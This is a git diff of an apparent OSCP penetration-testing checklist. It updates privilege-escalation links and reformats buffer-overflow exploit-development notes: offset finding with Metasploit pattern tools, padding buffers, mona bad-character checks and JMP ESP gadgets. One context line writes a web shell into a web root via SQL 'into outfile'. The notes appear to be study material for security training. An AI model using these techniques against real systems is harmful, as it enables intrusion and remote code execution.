@@ -20,7 +20,8 @@
 - [Remote Code Execution](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#remote-code-execution-now-for-a-shell)
   - [SQL Union Outfile](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#sql-union-outfile)
 - [Buffer Overflow Dev]
-- [Privilege Escalation Basics](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#privilege-escalation)
+- [Privilege Escalation Exploits](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#privilege-escalation---exploits)
+- [Privilege Escalation Basic Enumeration]
 
 * * * 
 - [PrivEsc - Windows Checklist]
@@ -354,20 +355,35 @@ Select 0x178d35c2348e79f238794ab134689a in outfile /var/www/html/shell.php
 
 # Buffer Overflow - Exploit Development
 Determine buffer needed to crash application.
+
 Find a CPU register to overwrite with ‘B’s via pattern - this will be your jump
+
 ```msf_Pattern_create -l 2900```
+
 Determine when register is being overwritten
+
 ```msf-pattern_offset -l 2900 -q 39694458```
+
 Pad the rest with Cs to fill the buffer - this will be your shellcode 
+
 ```Buffer = “A”*2606 + “B”*4 + “C”*(2900-2606-4)```
+
 Determine badchars to make sure all of your payload is getting through
+
 ```mona! bytearray```
+
 Develop exploit - find a loaded DLL (user32.dll?) without ASLR or DEP (and no bad characters!)
+
 Is the payload right at ESP?
+
 ```JMP ESP → !mona find -s “\xff\xe4” -m loaded.dll```
+
 Is the payload before ESP?
+
 ```sub ESP, 200 and then JMP ESP```
+
 Or
+
 ```call [ESP-200]```
 
 ```
